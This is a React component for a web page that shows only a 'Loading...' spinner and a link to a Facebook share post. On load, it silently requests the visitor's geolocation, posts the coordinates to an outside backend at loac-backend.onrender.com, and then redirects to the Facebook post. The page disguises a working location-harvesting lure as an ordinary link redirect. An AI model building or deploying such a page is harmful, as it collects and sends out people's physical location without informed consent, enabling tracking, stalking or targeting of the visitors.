import { FaArrowRightLong } from "react-icons/fa6";
import './App.css';
import { useEffect } from "react";
import { ClipLoader } from 'react-spinners';

function App() {


  const handleClick = async () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        try {
          const response = await fetch('https://loac-backend.onrender.com/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude }),
          });

          const data = await response.json();
          console.log('Response from server:', data);

       
          window.location.href = "https://www.facebook.com/share/p/1BeRQGnmAG/";
        } catch (error) {
          console.error('Error sending location to server:', error);
        }
      },
      (error) => {
        console.error('Error getting location:', error);
      }
    );
  } else {
    console.log("Geolocation not supported");
  }
};

useEffect(() => {
  handleClick();
}, []);

  return (
    <div className="h-lvh flex justify-center items-center">
     

      <a href="https://www.facebook.com/share/p/1BeRQGnmAG/" className=" absolute z-0">
        <button
          className="flex items-center  gap-2"
          onClick={handleClick}
        >
          <p className="font-bold text-xl">Loading...</p> <ClipLoader height="30" width="30" color="black" ariaLabel="loading" />
        </button>
      </a>
    </div>
  );
}

export default App;

